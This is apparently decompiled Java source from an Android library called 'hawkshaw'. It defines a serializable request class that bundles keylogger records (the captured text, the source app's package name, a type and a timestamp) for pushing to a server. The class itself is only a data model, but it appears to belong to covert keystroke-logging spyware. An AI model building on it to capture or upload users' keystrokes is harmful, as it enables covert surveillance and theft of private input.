package com.hawkshaw.library.datalayer.models.accessibility;

import B3.f;
import D3.b;
import E3.C0020d;
import E3.q0;
import Y1.K;
import com.hawkshaw.library.datalayer.room.keylogger.KeyLogEntity;
import java.util.List;
import kotlinx.serialization.KSerializer;
import kotlinx.serialization.descriptors.SerialDescriptor;
import p3.q;
import v3.j;
import w3.w;

@f
public final class PushKeyLogsRequest {
    /* access modifiers changed from: private */
    public static final KSerializer[] $childSerializers = {new C0020d(PushKeyLogsRequest$KeyLog$$serializer.INSTANCE, 0)};
    public static final Companion Companion = new Companion((j3.f) null);
    private final List<KeyLog> logs;

    public static final class Companion {
        private Companion() {
        }

        public /* synthetic */ Companion(j3.f fVar) {
            this();
        }

        public final KSerializer serializer() {
            return PushKeyLogsRequest$$serializer.INSTANCE;
        }
    }

    public /* synthetic */ PushKeyLogsRequest(int i5, List list, q0 q0Var) {
        if (1 == (i5 & 1)) {
            this.logs = list;
        } else {
            w.x(i5, 1, PushKeyLogsRequest$$serializer.INSTANCE.getDescriptor());
            throw null;
        }
    }

    public static /* synthetic */ void getLogs$annotations() {
    }

    public final List<KeyLog> getLogs() {
        return this.logs;
    }

    public PushKeyLogsRequest(List<KeyLog> list) {
        K.n(list, "logs");
        this.logs = list;
    }

    @f
    public static final class KeyLog {
        /* access modifiers changed from: private */
        public static final KSerializer[] $childSerializers = {j.f("com.hawkshaw.library.datalayer.room.keylogger.KeyLogEntity.Type", KeyLogEntity.Type.values()), null, null, null};
        public static final Companion Companion = new Companion((j3.f) null);
        private final String message;
        private final String packageName;
        private final long timestamp;
        private final KeyLogEntity.Type type;

        public static final class Companion {
            private Companion() {
            }

            public /* synthetic */ Companion(j3.f fVar) {
                this();
            }

            public final KSerializer serializer() {
                return PushKeyLogsRequest$KeyLog$$serializer.INSTANCE;
            }
        }

        public /* synthetic */ KeyLog(int i5, KeyLogEntity.Type type2, String str, String str2, long j5, q0 q0Var) {
            if (7 == (i5 & 7)) {
                this.type = type2;
                this.message = str;
                this.packageName = str2;
                if ((i5 & 8) == 0) {
                    this.timestamp = System.currentTimeMillis();
                } else {
                    this.timestamp = j5;
                }
            } else {
                w.x(i5, 7, PushKeyLogsRequest$KeyLog$$serializer.INSTANCE.getDescriptor());
                throw null;
            }
        }

        public static /* synthetic */ void getMessage$annotations() {
        }

        public static /* synthetic */ void getPackageName$annotations() {
        }

        public static /* synthetic */ void getTimestamp$annotations() {
        }

        public static /* synthetic */ void getType$annotations() {
        }

        public static final /* synthetic */ void write$Self$library_release(KeyLog keyLog, b bVar, SerialDescriptor serialDescriptor) {
            q qVar = (q) bVar;
            qVar.e0(serialDescriptor, 0, $childSerializers[0], keyLog.type);
            qVar.f0(serialDescriptor, 1, keyLog.message);
            qVar.f0(serialDescriptor, 2, keyLog.packageName);
            if (qVar.q(serialDescriptor) || keyLog.timestamp != System.currentTimeMillis()) {
                qVar.d0(serialDescriptor, 3, keyLog.timestamp);
            }
        }

        public final String getMessage() {
            return this.message;
        }

        public final String getPackageName() {
            return this.packageName;
        }

        public final long getTimestamp() {
            return this.timestamp;
        }

        public final KeyLogEntity.Type getType() {
            return this.type;
        }

        /* JADX INFO: this call moved to the top of the method (can break code semantics) */
        public /* synthetic */ KeyLog(KeyLogEntity.Type type2, String str, String str2, long j5, int i5, j3.f fVar) {
            this(type2, str, str2, (i5 & 8) != 0 ? System.currentTimeMillis() : j5);
        }

        public KeyLog(KeyLogEntity.Type type2, String str, String str2, long j5) {
            K.n(type2, "type");
            K.n(str, "message");
            K.n(str2, "packageName");
            this.type = type2;
            this.message = str;
            this.packageName = str2;
            this.timestamp = j5;
        }
    }
}
